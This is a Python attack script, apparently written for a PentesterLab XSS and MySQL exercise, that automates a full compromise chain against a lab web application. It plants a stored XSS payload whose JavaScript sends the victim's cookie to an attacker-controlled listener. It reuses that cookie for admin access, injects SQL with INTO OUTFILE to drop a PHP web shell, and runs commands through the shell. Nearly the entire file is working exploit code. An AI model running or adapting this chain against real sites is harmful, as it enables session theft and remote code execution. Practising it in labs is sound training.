from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from sys import argv
from  urllib import parse
import threading
import time
import  requests

#exercice: https://pentesterlab.com/exercises/xss_and_mysql_file/course

ip_victim="172.16.113.150"
ip_attacker="172.16.113.148"
port=9090


''' 
xss.js 

function xss(){
        var  img = document.createElement('img');
        img.src = 'http://ip_attacker:port/?'+document.cookie;
        document.body.appendChild(img)
}

xss();

'''



def xss_attack():
	uri="http://"+IP_victim +"/post_comment.php?id=2"
	vector="<script src=\""+"http://"+ip_attacker+":"+str(port)+"/xss.js\"></script>"
	payload={'title':'test', 'author':'test','text':vector,'submit':'submit'}
	r=requests.post(uri, data=payload)
	print("Sending xss..")
	
def get_admin(cookie_value):
	uri_admin="http://"+ip_victim+"/admin/"
	cookie_admin={'Cookie': cookie_value}
	r = requests.get(uri_admin, headers=cookie_admin)

	

def remote_shell(cookie_value):
	uri_sqli="http://"+ip_victim+"/admin/edit.php"
	payload={'id':'2 union select 1,2, "<?php system($_GET[\'c\']); ?>",3 into outfile "/var/www/css/shell.php"'}
	cookie_admin={'Cookie':cookie_value}
	r=requests.get(uri_sqli, params=payload, headers=cookie_admin)
	print("Sending shell...")
	

def command_test():
	uri="http://"+ip_victim+"/css/shell.php"
	payload={'c':'uname;id;date'}
	r=requests.get(uri, params=payload)
	print(r.text)


class Handler(SimpleHTTPRequestHandler):
	def do_GET(self):
		parsed_path = parse.urlparse(self.path)
		message_parts = [
            	'CLIENT VALUES:',
            	'>client_address={} ({})'.format(
                self.client_address,
                self.address_string()),
            	'>command={}'.format(self.command),
            	'>path={}'.format(self.path),
            	'>real path={}'.format(parsed_path.path),
            	'>query=>{}'.format(parsed_path.query),
            	'>request_version={}'.format(self.request_version),
		'',
           	'HEADERS RECEIVED:',
        	]
		for name, value in sorted(self.headers.items()):
			message_parts.append(
				'>{}={}'.format(name, value.rstrip())
			)
		message_parts.append('')
		message = '\r\n'.join(message_parts)
		#print(message)
		cookie= parsed_path.query
		if(cookie):
			# server down
			thread2.start()
			print("Server down")
			get_admin(cookie)
			remote_shell(cookie)
			command_test()
		
		SimpleHTTPRequestHandler.do_GET(self)


#main

server= TCPServer(("", port), Handler)
print("Server Up")
thread=threading.Thread(target=server.serve_forever)
thread.start()
xss_attack()
thread2=threading.Thread(target=server.shutdown)

